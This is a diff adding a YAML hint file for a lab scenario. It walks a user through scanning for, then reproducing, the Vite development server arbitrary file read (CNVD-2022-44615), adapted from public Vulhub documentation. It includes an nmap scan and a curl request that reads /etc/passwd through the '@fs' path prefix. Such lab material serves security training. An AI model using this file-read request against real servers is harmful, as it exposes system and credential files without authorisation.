@@ -1,0 +1,64 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: vite/CNVD-2022-44615
+hint_levels:
+  low:
+  - Inspect the vite service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 3000. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 3000 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 3000/tcp → container 3000/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:3000`, `http://{{NODE_IP}}:3000/`.'
+  high:
+  - 'Vulnerability: Vite Development Server Arbitrary File Read (CNVD-2022-44615).'
+  - |-
+    Vulnerability Reproduction
+
+    You can read arbitrary files on the filesystem by using the standard `@fs` prefix:
+
+    ```bash
+    curl "http://{{NODE_IP}}:3000/@fs/etc/passwd"
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/vite/CNVD-2022-44615/1.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/vite/CNVD-2022-44615/README.md'
+  - |-
+    Additional public references:
+    - https://github.com/vitejs/vite/issues/2820
+access_instructions:
+  title: Vite Development Server Arbitrary File Read (CNVD-2022-44615)
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 3000. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 3000 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 3000/tcp → container 3000/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:3000`, `http://{{NODE_IP}}:3000/`.
+  - title: Vulnerability Reproduction
+    instructions: |-
+      You can read arbitrary files on the filesystem by using the standard `@fs` prefix:
+
+      ```bash
+      curl "http://{{NODE_IP}}:3000/@fs/etc/passwd"
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/vite/CNVD-2022-44615/1.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/vite/CNVD-2022-44615/README.md
+  readme_sha256: 0aeac4a952bff69c952ff928f7c3d461a0d81ef2afa828f54227c6544e8e140b
+  compose_sha256: 234acc3026543e2778f427ae45b8df722f9ce8bd6b6349848574776ef50e1798
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
